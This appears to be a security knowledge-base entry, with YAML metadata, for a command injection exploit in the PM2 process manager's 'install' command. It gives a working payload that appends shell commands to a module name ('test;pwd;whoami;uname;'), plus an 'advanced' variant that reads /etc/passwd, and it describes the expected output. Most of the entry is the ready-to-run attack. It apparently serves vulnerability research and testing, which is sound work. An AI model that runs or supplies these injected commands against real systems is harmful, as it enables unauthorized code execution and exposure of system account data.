---
data: ./pm2 install "test;pwd;whoami;uname;"
tags:
  - exploit
  - injection
type: command
output: >-
  NPM warnings, installation of 'test@0.6.0', outputs from pwd, whoami, uname,
  error about --loglevel=error, and PM2 status tables
executor: bash
platforms:
  - Node.js
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.442Z'
id: 1cb397c6-5b2b-4905-9794-2ad03eade1d5
verified: false
validated: true
submitted: true
---
# pm2-install-malicious-module

## Command

```bash
./pm2 install "test;pwd;whoami;uname;"
```

## Description

Exploits command injection by installing a fake module with appended shell commands, triggering execution in PM2's spawn call during the npm install process.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `install` | Installs the specified module | Yes |
| `test;pwd;whoami;uname;` | Payload: 'test' as module, followed by injected Unix commands | Yes |

## Examples

### Basic Usage

```bash
./pm2 install "test;pwd;whoami;uname;"
```

### Advanced Usage

```bash
./pm2 install "malicious;id;cat /etc/passwd;"
```

## Expected Output

NPM warnings for invalid module, partial installation of 'test@0.6.0', direct outputs from injected commands (e.g., pwd: /Users/bl4de, whoami: bl4de, uname: Darwin), --loglevel=error suppression note, and PM2 module status tables.

## Related

- [[commands/pm2-install-payload]]
- [[procedures/Exploit-PM2-CLI-Command-Injection]]
